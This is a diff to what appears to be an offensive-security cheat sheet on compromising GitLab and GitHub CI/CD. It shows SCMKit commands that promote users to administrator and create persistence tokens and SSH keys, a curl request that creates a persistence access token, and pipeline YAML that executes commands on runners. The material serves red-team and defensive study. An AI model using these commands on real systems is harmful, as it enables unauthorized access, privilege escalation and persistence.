@@ -1,14 +1,6 @@
 # Source Code Management & CI/CD Compromise
 
-> 
-
-## Summary
-
-* [Tools](#tools)
-* [Enumerate repositories files and secrets](#enumerate-repositories-files-and-secrets)
-* [Personal Access Token](#personal-access-token)
-* [Gitlab CI/Github Actions](#gitlab-cigithub-actions)
-* [References](#references)
+> CI/CD is a method to frequently deliver apps to customers by introducing automation into the stages of app development. The main concepts attributed to CI/CD are continuous integration, continuous delivery, and continuous deployment. Compromises in CI/CD can occur through unauthorized access, misconfiguration, dependency vulnerabilities, insecure secrets, and lack of visibility.
 
 
 ## Tools
@@ -51,17 +43,24 @@ Using [SCMKit - Source Code Management Attack Toolkit](https://github.com/xforce
     SCMKit.exe -s gitlab -m listrunner -c userName:password -u https://gitlab.something.local
     SCMKit.exe -s gitlab -m listrunner -c apikey -u https://gitlab.something.local
     ```
-* Get the assigned privileges to an access token being used in a particular SCM system
-    ```ps1
-    SCMKit.exe -s gitlab -m privs -c apiKey -u https://gitlab.something.local
-    ```
 * Promote a normal user to an administrative role in a particular SCM system
     ```ps1
     SCMKit.exe -s gitlab -m addadmin -c userName:password -u https://gitlab.something.local -o targetUserName
     SCMKit.exe -s gitlab -m addadmin -c apikey -u https://gitlab.something.local -o targetUserName
     SCMKit.exe -s gitlab -m removeadmin -c userName:password -u https://gitlab.something.local -o targetUserName
     ```
-* Create/List/Delete an access token to be used in a particular SCM system
+
+
+## Personal Access Token
+
+Create a PAT (Personal Access Token) as a persistence mechanism for the Gitlab instance.
+
+* Manual
+    ```ps1
+    curl -k --request POST --header "PRIVATE-TOKEN: apiToken" --data "name=user-persistence-token" --data "expires_at=" --data "scopes[]=api" --data "scopes[]=read_repository" --data "scopes[]=write_repository" "https://gitlabHost/api/v4/users/UserIDNumber/personal_access_tokens"
+    ```
+
+* Using `SCMKit.exe`: Create/List/Delete an access token to be used in a particular SCM system
     ```ps1
     SCMKit.exe -s gitlab -m createpat -c userName:password -u https://gitlab.something.local -o targetUserName
     SCMKit.exe -s gitlab -m createpat -c apikey -u https://gitlab.something.local -o targetUserName
@@ -69,6 +68,14 @@ Using [SCMKit - Source Code Management Attack Toolkit](https://github.com/xforce
     SCMKit.exe -s gitlab -m listpat -c userName:password -u https://gitlab.something.local -o targetUser
     SCMKit.exe -s gitlab -m listpat -c apikey -u https://gitlab.something.local -o targetUser
     ```
+* Get the assigned privileges to an access token being used in a particular SCM system
+    ```ps1
+    SCMKit.exe -s gitlab -m privs -c apiKey -u https://gitlab.something.local
+    ```
+
+
+## SSH Keys
+
 * Create/List an SSH key to be used in a particular SCM system
     ```ps1
     SCMKit.exe -s gitlab -m createsshkey -c userName:password -u https://gitlab.something.local -o "ssh public key"
@@ -79,15 +86,8 @@ Using [SCMKit - Source Code Management Attack Toolkit](https://github.com/xforce
     SCMKit.exe -s gitlab -m removesshkey -c apiToken -u https://gitlab.something.local -o sshKeyID
     ```
 
-## Personal Access Token
 
-Create a PAT (Personal Access Token) as a persistence mechanism for the Gitlab instance.
-
-```ps1
-curl -k --request POST --header "PRIVATE-TOKEN: apiToken" --data "name=user-persistence-token" --data "expires_at=" --data "scopes[]=api" --data "scopes[]=read_repository" --data "scopes[]=write_repository" "https://gitlabHost/api/v4/users/UserIDNumber/personal_access_tokens"
-```
-
-## Gitlab CI/Github Actions
+## Gitlab CI
 
 * Gitlab-CI "Command Execution" example: `.gitlab-ci.yml`
     ```yaml
@@ -107,6 +107,22 @@ curl -k --request POST --header "PRIVATE-TOKEN: apiToken" --data "name=user-pers
         tags:
             - ${RUNNER}
     ```
+
+
+### Gitlab Executors
+
+* **Shell** executor: The jobs are run with the permissions of the GitLab Runner’s user and can steal code from other projects that are run on this server.
+* **Docker** executor: Docker can be considered safe when running in non-privileged mode.
+* **SSH** executor: SSH executors are susceptible to MITM attack (man-in-the-middle), because of missing `StrictHostKeyChecking` option. 
+
+
+### Gitlab CI/CD variables
+
+CI/CD Variables are a convenient way to store and use data in a CI/CD pipeline, but variables are less secure than secrets management providers
+
+
+## Github Actions
+
 * Github Action "Command Execution" example: `.github/workflows/example.yml`
     ```yml
     name: example
@@ -127,7 +143,10 @@ curl -k --request POST --header "PRIVATE-TOKEN: apiToken" --data "name=user-pers
               whoami
     ```
     
+
 ## References
 
 * [Controlling the Source: Abusing Source Code Management Systems - Brett Hawkins - August 9, 2022](https://securityintelligence.com/posts/abusing-source-code-management-systems/)
 * [CI/CD SECRETS EXTRACTION, TIPS AND TRICKS - Hugo Vincent, Théo Louis-Tisserand - 01/03/2023](https://www.synacktiv.com/publications/cicd-secrets-extraction-tips-and-tricks.html)
+* [Security for self-managed runners - Gitlab](https://docs.gitlab.com/runner/security/)
+* [Fixing Typos and Breaching Microsoft’s Perimeter - John Stawinski IV - April 15, 2024](https://johnstawinski.com/2024/04/15/fixing-typos-and-breaching-microsofts-perimeter/)
